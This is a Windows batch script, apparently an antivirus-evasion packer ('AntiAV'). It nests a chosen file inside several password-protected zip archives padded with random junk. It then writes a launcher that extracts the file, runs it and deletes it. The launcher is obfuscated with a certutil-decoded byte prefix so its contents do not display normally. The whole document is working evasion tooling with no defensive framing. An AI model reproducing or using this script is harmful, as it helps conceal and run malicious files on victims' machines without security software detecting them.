:: Programmed by hXR16F
:: hXR16F.ar@gmail.com

@echo off&setlocal EnableDelayedExpansion&mode 80,25&echo [+] Drag ^& drop your file into this window and hit enter.&set /p "file=[+] File: "
for %%i in ("%file%") do set filename=%%~nxi&&call 7z.exe a -tzip file_1.zip -mx7 %file% >nul
echo [*] Generating junk code...&for /l %%i in (1,1,48) do (<nul set /p =!random!>> "junk")
echo [*] Multiple packing...&set r=%random:~2,1%&set /a i_2=1
for /l %%i in (1,1,1!r!) do ((set /a i_2+=1&call 7z.exe a -tzip file_!i_2!.zip -mx1 file_%%i.zip >nul)&&del /f /q file_%%i.zip)
echo [*] Injecting junk code...&copy /b AntiAV.data+junk AntiAV2.data >nul
del /f /q AntiAV.data >nul&del /f /q junk >nul&ren AntiAV2.data AntiAV.data >nul
call 7z.exe u file_!i_2!.zip AntiAV.data >nul&echo [*] Reducing size and securing file...&set key=___________%random%pwd%random%pwd%random%___________
call 7z.exe a -tzip file.zip -p%key% -mx7 file_!i_2!.zip >nul
(ren file.zip file.bin >nul&del /f /q file_!i_2!.zip >nul)&echo [*] Creating launcher...&
set /a bb=!r!+11
(
	echo @echo off>> "main.bat"
	echo md extracted>> "main.bat"
	echo ren file.bin file.zip>> "main.bat"
	echo call 7z.exe e file.zip -p%key% -oextracted >> "main.bat"
	echo for /l %%%%i in ^(!bb!,-1,1^) do ^(>> "main.bat"
	echo call 7z.exe e extracted/file_%%%%i.zip -oextracted>> "main.bat"
	echo ^)>> "main.bat"&echo ren file.zip file.bin>> "main.bat"
	echo cd extracted>> "main.bat"
	echo move "!filename!" ../>> "main.bat"
	echo cd..>> "main.bat"
	echo rd /s /q extracted>> "main.bat"
	echo call "!filename!">> "main.bat"
	echo @ping localhost -n 2 ^>nul >> "main.bat"
	echo del /f /q "!filename!">> "main.bat"
)
call :obfuscate main.bat&&del /f /q "main.bat" >nul
ren "main_.bat" "main.bat"&echo [*] Finalizing...
md "ready" >nul&move file.bin "ready" >nul&move main.bat "ready" >nul&copy 7z.exe "ready" >nul&copy 7z.dll "ready" >nul&echo [*] Done.&pause >nul&&goto :eof
:obfuscate %1
if "%~1" equ "" (exit /b)&for /f %%i in ("certutil.exe") do if not exist "%%~$path:i" (exit /b)
>"temp.~b64" echo(//4mY2xzDQo=
certutil.exe -f -decode "temp.~b64" "%~n1_%~x1" >nul
(del "temp.~b64" >nul&copy "%~n1_%~x1" /b + "%~1" /b >nul)&&exit /b
